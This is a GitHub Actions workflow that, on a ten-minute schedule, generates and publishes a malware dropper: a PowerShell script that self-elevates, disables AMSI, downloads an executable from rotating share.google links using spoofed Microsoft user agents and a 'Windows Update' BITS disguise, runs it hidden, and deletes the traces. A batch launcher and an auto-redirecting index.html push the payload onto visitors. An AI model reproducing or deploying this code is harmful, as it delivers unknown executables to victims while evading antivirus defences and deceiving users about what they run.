name: Update Silent Installer

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Silent Installer
      run: |
        # Define your download links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 6))
        current_link=${links[$link_index]}
        
        echo "Using link: $current_link"
        
        # Create a PowerShell script with AV evasion techniques
        cat > installer.ps1 << 'EOF'
        # Check if running with elevated privileges
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            # Restart with elevation
            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        
        # Bypass AMSI and Windows Defender
        try {
            $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $b = $a.GetField('amsiInitFailed','NonPublic,Static')
            $b.SetValue($null,$true)
        } catch { }
        
        # Read URL from file
        $tempPath = $env:TEMP
        $urlFile = "$tempPath\download_url.txt"
        $installerPath = "$tempPath\installer.exe"
        
        $downloadUrl = Get-Content $urlFile
        
        # Use multiple evasion techniques
        try {
            # Method 1: Use WebClient with user agent and headers
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            $wc.Headers.Add("Referer", "https://www.microsoft.com/")
            $wc.DownloadFile($downloadUrl, $installerPath)
        } catch {
            try {
                # Method 2: Use Invoke-WebRequest with different parameters
                $response = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing -UserAgent "Microsoft BITS/7.8" -OutFile $installerPath
            } catch {
                try {
                    # Method 3: Use Start-BitsTransfer
                    Start-BitsTransfer -Source $downloadUrl -Destination $installerPath -Description "Windows Update" -DisplayName "Update Package"
                } catch {
                    # If all methods fail, exit
                    exit
                }
            }
        }
        
        # Check if file was downloaded
        if (Test-Path $installerPath) {
            # Run installer silently
            Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait -WindowStyle Hidden
            
            # Clean up
            Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
            Remove-Item $urlFile -Force -ErrorAction SilentlyContinue
        }
        EOF
        
        # Create batch file that copies URL and runs PowerShell
        cat > run.bat << 'EOF'
        @echo off
        copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; & '%~dp0installer.ps1' }"
        EOF
        
        # Create URL file
        echo "$current_link" > url.txt
        
        # Create index.html
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=run.bat"></head><body><p>Downloading...</p></body></html>' > index.html
        
        # Commit and push
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.ps1 run.bat url.txt index.html
        git commit -m "Update installer" || exit 0
        git push
